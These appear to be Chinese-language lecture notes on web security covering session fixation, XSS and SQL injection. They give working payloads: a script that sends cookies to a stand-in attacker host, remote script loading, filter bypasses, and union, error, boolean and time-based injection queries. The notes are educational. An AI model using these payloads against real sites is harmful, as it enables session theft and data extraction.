# Web Security
Slides:
 * [Web_Security](Web Security_1120.pdf)

## Why Cookie/Session?
HTTP 是stateless protocol, 你要怎麼知道user 已經登入你的網站？By Cookie/Session!
 * Server端：發行session_id給client，並建立session_id entry, 以後用這個session_id來辨認使用者是否已經成功登入
 * Client端：用帳號密碼登入後，拿到server傳來的cookie(session_id)，存起來，以後可以直接用cookie和server做身份驗證，而不用整個做帳號密碼驗證。

### Hacking session_id
 * bruteforce
 * session hijacking：XSS傳給attacker，sniff封包
 * session fixation：如果server可以接受任何session_id(from query string)且沒有其他安全機制的話，那attacker可以傳送`http://unsafe.haha.com/session_id=some_fixed_sid`給victim，如果victim點開連結，成功登入後，server端會把some_fixed_sid 當成valid login-session (如果沒有衝突)存起來。那麼attacker只要 打開`http://unsafe.haha.com/session_id=some_fixed_sid`就能看見victom 帳戶內容了。

## XSS
Cross-Site Script: 你可以讓Javascript code在其他user 的瀏覽器上執行，可以下載malicious file, 偷cookie,...
 * Reflected XSS: 當網站把收到的**user input直接include 到網頁**裡，像這樣：
```php
<input type="text" name="mail" value="<?php echo $_GET['m']; >">
```
XSS攻擊：`"><script>alert("XSS")</script>`
或載入程式碼並執行：
```js
<script src="http://www.evilsite.com/xss.js"></script>
```
 * persistent XSS: 當網站不只直接讀入**user input**，還把user input存到persisten storage(ex: 資料庫)裡，然後讀出來呈現在網頁上。那麼狀況更糟，注入javascipt code後，任何瀏覽那個網頁的user都會被攻擊。例如：一個blogger網站，會存入任何你給的blog entry 然後show在網頁上，如果你想要都任何瀏覽過你blog的人的session_id，可以這樣做：
```js
<script>window.location='http://attacker/?cookie='+document.cookie</script>
```

### XSS Defense/Passby
 * 過濾`script`：Passby - `<ScriPt></scRiPt>`, `<sccriptript></sccriptript>`
 * 過濾`"`, `'`：Passby - `<script>alert(String.fromCharCode(...))</script>`
 * 設定HttpOnly(禁止用Javascript讀出cookie)：Passby - 很多瀏覽器沒有預設

## SQL Injection
 * 可以看到錯誤訊息：
  * Union-Based：通常和Select 一起用，Union上相同欄位的資料。Ex: `SELECT *FROM users WHERE id=1`：
```sql
SELECT FROM users WHERE id=1 UNION SELECT 1,2,3,4,5
```
```sql
-- 猜欄位
SELECT FROM users WHERE id=1 ORDER BY 5;
```
如果猜中欄位數會把`id=1`結果和`1,2,3,4,5`一起印出來，之後將`1,2,3,4,5`可以替換成其他資訊
```sql
version(),  user() database()
-- 資料庫schema
SELECT schema_name FROM informtion_schema.schema
-- Table
SELECT table_name FROM information_schema.tables
-- Column
SELECT column_name FROM information_schema.columns
```
  * Error-Based
```sql
-- 沒很懂，but it works..
SELECT * FROM users WHERE id=1 and (select 1 from(select count(*),concat((select (select concat(0x27,user(),0x27)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) = 1;
```
`ERROR 1062 (23000): Duplicate entry ''root@localhost'1' for key 'group_key'`
```sql
-- ExtractValue:
SELECT * FROM users WHERE id=1 AND extractvalue(rand(), (SELECT user()))=1
```
`ERROR 1105 (HY000): XPATH syntax error: '@localhost'`
 * 只能看到成功或失敗
  * Boolean-Based
```sql
-- 猜注入口是接受數字還是字串
SELECT * FROM users WHERE id=1 AND 1=1
-- 如果是數字就更方便了
-- 猜user1 第一個字母
SELECT * FROM users WHERE id=1 AND substr((SELECT name FROM users LIMIT 0,1), 1, 1)='a'
-- 用Ascii 猜字母
SELECT * FROM users WHERE id=1 AND ascii(substr((SELECT name FROM users LIMIT 0,1), 1, 1)) < 64
```
  * Time-Based
```sql
SELECT * FROM users WHERE id=1 AND (sleep(2))
-- if it works, then combine with if()
SELECT * FROM users WHERE id=1 AND if((substr((SELECT name FROM users LIMIT 0,1), 1, 1)='a'), sleep(2), 1)
```
## Today's Vulnerable
 * [alert(1) to win](http://escape.alf.nu/)
 * [prompt(1) to win](http://prompt.ml/0)
 * [XSS game](https://xss-game.appspot.com/)
